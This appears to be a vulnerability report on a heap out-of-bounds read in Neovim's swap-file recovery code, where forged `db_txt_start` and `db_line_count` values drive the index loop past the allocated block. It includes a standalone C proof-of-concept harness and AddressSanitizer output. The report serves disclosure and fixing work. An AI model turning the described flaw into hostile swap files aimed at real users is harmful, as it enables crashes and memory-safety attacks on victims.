# Swap recovery trusts hostile `db_txt_start` and walks `db_index[]` out of the page

## Broken invariant

During recovery, a `DataBlock` returned by `mf_get(mfp, bnum, page_count)` is
only `page_count * mf_page_size` bytes long. The on-disk header must satisfy:

`HEADER_SIZE + db_line_count * sizeof(unsigned) <= db_txt_start <= db_txt_end == page_count * mf_page_size`

so that the whole `db_index[]` array fits before the text area inside that
allocation. Hostile swap metadata must never let `ml_recover()` read
`db_index[]` past the loaded block.

That invariant is broken in the data-block recovery loop. `ml_recover()` fixes
`db_txt_end` to `page_count * mf_page_size`, but it never validates the
attacker-controlled `db_txt_start`. It then uses that same untrusted
`db_txt_start` as the only upper bound before dereferencing `dp->db_index[i]`.
If a swap file sets `db_txt_start` past the real end of the loaded page and
keeps `db_line_count` large, recovery walks `db_index[]` out of bounds.

Normal writers establish and maintain that invariant when creating, growing, and
shrinking data blocks (`src/nvim/memline.c:380-382`,
`src/nvim/memline.c:2087-2089`, `src/nvim/memline.c:2737-2738`,
`src/nvim/memline.c:2966-2974`), but recovery does not re-check that the
hostile block still satisfies it before iterating the index array.

## Input -> normalization -> policy gate -> sink

1. **Input**: a hostile swap file is fed to recovery mode (`runtime/doc/starting.txt:153-157`)
   or another crash-recovery flow that reads an existing swap file created for
   the documented swap/recovery feature (`runtime/doc/options.txt:7088-7095`).
   The attacker controls the `DataBlock` header fields `db_txt_start`,
   `db_txt_end`, `db_line_count`, and the trailing `db_index[]` entries
   (`src/nvim/memline.c:136-147`).
2. **Normalization**:
   - `ml_recover()` descends the pointer tree and validates `pe_bnum` /
     `pe_page_count` before calling `mf_get()` (`src/nvim/memline.c:1069-1078`).
   - `mf_get()` allocates exactly `page_count * mf_page_size` bytes for the
     block (`src/nvim/memfile.c:286-324`, `src/nvim/memfile.c:492-498`).
   - In the data-block case, recovery repairs only `db_txt_end` to that exact
     block size and then force-writes a trailing NUL there
     (`src/nvim/memline.c:1107-1120`).
3. **Policy gate**:
   - The intended guard is the loop check
     `&(dp->db_index[i]) >= (char *)dp + dp->db_txt_start`
     (`src/nvim/memline.c:1134-1136`).
   - But `db_txt_start` is hostile metadata too, and recovery never checks that
     `db_txt_start <= page_count * mf_page_size` or that `db_line_count` fits
     before `db_txt_start`.
4. **Sink**:
   - With `db_txt_start` forged past the end of the actual allocation,
     the guard keeps succeeding long after `i` has advanced beyond the block.
   - Recovery then dereferences `dp->db_index[i]`
     (`src/nvim/memline.c:1142`) out of bounds, turning hostile swap metadata
     into a heap OOB read inside the core recovery parser.

## Minimal reproducer

### Reproducer file

This standalone harness copies the exact `DataBlock` layout and the vulnerable
data-block loop from `src/nvim/memline.c:1107-1156`. It models the real
allocation size (`page_count * mf_page_size`) and then feeds the loop a hostile
`db_txt_start` that lies beyond that allocation:

```c
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef int32_t linenr_T;
typedef int colnr_T;

enum { DATA_ID = (('d' << 8) + 'a') };

typedef struct {
  uint16_t db_id;
  unsigned db_free;
  unsigned db_txt_start;
  unsigned db_txt_end;
  long db_line_count;
  unsigned db_index[];
} DataBlock;

#define DB_MARKED ((unsigned)1 << ((sizeof(unsigned) * 8) - 1))
#define DB_INDEX_MASK (~DB_MARKED)
#define HEADER_SIZE ((unsigned)offsetof(DataBlock, db_index))

static int ml_append(linenr_T lnum, char *line, colnr_T len, int newfile)
{
  (void)lnum;
  (void)line;
  (void)len;
  (void)newfile;
  return 0;
}

int main(void)
{
  unsigned page_count = 1;
  unsigned mf_page_size = 64;
  linenr_T lnum = 0;
  linenr_T line_count = 64;
  int error = 0;
  char *p;

  DataBlock *dp = calloc(page_count, mf_page_size);
  if (dp == NULL) {
    perror("calloc");
    return 1;
  }

  dp->db_id = DATA_ID;
  dp->db_txt_end = page_count * mf_page_size;
  dp->db_txt_start = 128;  // hostile: past the end of the allocated page
  dp->db_line_count = 64;  // hostile: keeps the recovery loop walking indexes
  dp->db_index[0] = HEADER_SIZE;

  bool has_error = false;
  if (page_count * mf_page_size != dp->db_txt_end) {
    ml_append(lnum++, "??? from here until ???END lines may be messed up", 0, 1);
    error++;
    has_error = true;
    dp->db_txt_end = page_count * mf_page_size;
  }

  *((char *)dp + dp->db_txt_end - 1) = '\0';

  if (line_count != dp->db_line_count) {
    ml_append(lnum++, "??? from here until ???END lines may have been inserted/deleted", 0, 1);
    error++;
    has_error = true;
  }

  bool did_questions = false;
  for (int i = 0; i < dp->db_line_count; i++) {
    if ((char *)&(dp->db_index[i]) >= (char *)dp + dp->db_txt_start) {
      error++;
      ml_append(lnum++, "??? lines may be missing", 0, 1);
      break;
    }

    int txt_start = (dp->db_index[i] & DB_INDEX_MASK);
    if (txt_start <= (int)HEADER_SIZE || txt_start >= (int)dp->db_txt_end) {
      error++;
      if (did_questions) {
        continue;
      }
      did_questions = true;
      p = "???";
    } else {
      did_questions = false;
      p = (char *)dp + txt_start;
    }
    ml_append(lnum++, p, 0, 1);
  }

  if (has_error) {
    ml_append(lnum++, "???END", 0, 1);
  }

  printf("error=%d lnum=%d\n", error, (int)lnum);
  free(dp);
  return 0;
}
```

### Commands

```bash
cat >/tmp/swap_recover_db_index_oob.c <<'EOF'
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef int32_t linenr_T;
typedef int colnr_T;

enum { DATA_ID = (('d' << 8) + 'a') };

typedef struct {
  uint16_t db_id;
  unsigned db_free;
  unsigned db_txt_start;
  unsigned db_txt_end;
  long db_line_count;
  unsigned db_index[];
} DataBlock;

#define DB_MARKED ((unsigned)1 << ((sizeof(unsigned) * 8) - 1))
#define DB_INDEX_MASK (~DB_MARKED)
#define HEADER_SIZE ((unsigned)offsetof(DataBlock, db_index))

static int ml_append(linenr_T lnum, char *line, colnr_T len, int newfile)
{
  (void)lnum;
  (void)line;
  (void)len;
  (void)newfile;
  return 0;
}

int main(void)
{
  unsigned page_count = 1;
  unsigned mf_page_size = 64;
  linenr_T lnum = 0;
  linenr_T line_count = 64;
  int error = 0;
  char *p;

  DataBlock *dp = calloc(page_count, mf_page_size);
  if (dp == NULL) {
    perror("calloc");
    return 1;
  }

  dp->db_id = DATA_ID;
  dp->db_txt_end = page_count * mf_page_size;
  dp->db_txt_start = 128;
  dp->db_line_count = 64;
  dp->db_index[0] = HEADER_SIZE;

  bool has_error = false;
  if (page_count * mf_page_size != dp->db_txt_end) {
    ml_append(lnum++, "??? from here until ???END lines may be messed up", 0, 1);
    error++;
    has_error = true;
    dp->db_txt_end = page_count * mf_page_size;
  }

  *((char *)dp + dp->db_txt_end - 1) = '\0';

  if (line_count != dp->db_line_count) {
    ml_append(lnum++, "??? from here until ???END lines may have been inserted/deleted", 0, 1);
    error++;
    has_error = true;
  }

  bool did_questions = false;
  for (int i = 0; i < dp->db_line_count; i++) {
    if ((char *)&(dp->db_index[i]) >= (char *)dp + dp->db_txt_start) {
      error++;
      ml_append(lnum++, "??? lines may be missing", 0, 1);
      break;
    }

    int txt_start = (dp->db_index[i] & DB_INDEX_MASK);
    if (txt_start <= (int)HEADER_SIZE || txt_start >= (int)dp->db_txt_end) {
      error++;
      if (did_questions) {
        continue;
      }
      did_questions = true;
      p = "???";
    } else {
      did_questions = false;
      p = (char *)dp + txt_start;
    }
    ml_append(lnum++, p, 0, 1);
  }

  if (has_error) {
    ml_append(lnum++, "???END", 0, 1);
  }

  printf("error=%d lnum=%d\n", error, (int)lnum);
  free(dp);
  return 0;
}
EOF

cc -std=c11 -Wall -Wextra -fsanitize=address -fno-omit-frame-pointer -O1 -g \
  /tmp/swap_recover_db_index_oob.c -o /tmp/swap_recover_db_index_oob

/tmp/swap_recover_db_index_oob
```

### Expected

- Recovery should reject or clamp a hostile `DataBlock` whose `db_txt_start`
  lies past `page_count * mf_page_size`.
- `db_line_count` must never make `ml_recover()` walk `db_index[]` beyond the
  bytes actually allocated by `mf_get()`.

### Actual

On this box, AddressSanitizer reports a heap-buffer-overflow read at the copied
`dp->db_index[i]` access:

```text
==12860==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x506000000060
READ of size 4 at 0x506000000060 thread T0
    #0 ... in main /tmp/swap_recover_db_index_oob.c:80
...
0x506000000060 is located 0 bytes after 64-byte region [0x506000000020,0x506000000060)
allocated by thread T0 here:
    #0 ... in calloc ...
    #1 ... in main /tmp/swap_recover_db_index_oob.c:44
```

That copied line is the same operation as `src/nvim/memline.c:1142`; the only
thing required to trigger it is hostile swap metadata that makes the guard at
`src/nvim/memline.c:1135` trust a forged `db_txt_start`.

## Affected files

- `runtime/doc/starting.txt:153-157` — `-r` / recovery mode reads a swap file
  to recover a crashed session.
- `runtime/doc/options.txt:7088-7095` — swap files are created for the
  crash-recovery feature and can be disabled with `'swapfile'`.
- `src/nvim/memline.c:136-147` — `DataBlock` contains hostile `db_txt_start`,
  `db_txt_end`, and `db_line_count` fields.
- `src/nvim/memline.c:1069-1078` — recovery validates pointer metadata
  (`pe_bnum` / `pe_page_count`) before calling `mf_get()`.
- `src/nvim/memfile.c:286-324` — `mf_get()` reads the requested block.
- `src/nvim/memfile.c:492-498` — the block buffer is only
  `page_count * mf_page_size` bytes long.
- `src/nvim/memline.c:1107-1145` — `ml_recover()` corrects `db_txt_end` but
  still trusts `db_txt_start` and `db_line_count` while walking `db_index[]`.
- `src/nvim/memline.c:380-382`, `src/nvim/memline.c:2087-2089`,
  `src/nvim/memline.c:2737-2738`, `src/nvim/memline.c:2966-2974` — normal
  writer paths establish and maintain the in-bounds `db_txt_start` /
  `db_line_count` relationship that recovery fails to re-validate.

## History / variant signal

The task brief already pointed to the recent hardening around pointer-entry
fields `pe_line_count`, `pe_old_lnum`, `pe_bnum`, and `pe_page_count`. This is
the sibling invariant one level later in the parser: recovery now validates the
pointer metadata that gets us to a block, but it still trusts hostile
data-block metadata once that block is loaded.

In other words, the fix closed the "which block do we read and how large is it"
part of the chain, but not the "how far do we walk inside that loaded block"
part.

## Impact / severity

This is a real **heap out-of-bounds read in a hostile-file parser**.

The attacker-controlled object is a swap file, so the victim has to enter a
recovery flow rather than merely open an ordinary text file. That keeps this
below the most serious file-open bug class. But once recovery is attempted,
hostile metadata crosses directly into core C pointer arithmetic and reads past
the `mf_get()` allocation boundary.

I would rate this **medium severity**:

- it is memory-unsafe C, not just incorrect recovery output;
- it is reachable from attacker-supplied swap metadata in a documented recovery
  feature;
- but it requires the victim to recover from a hostile swap file, so I am not
  claiming default plain-file open reachability or a stable RCE primitive here.

At minimum this gives an attacker a reproducible recovery-time crash under
sanitizers and a concrete parser memory-safety violation in production builds.
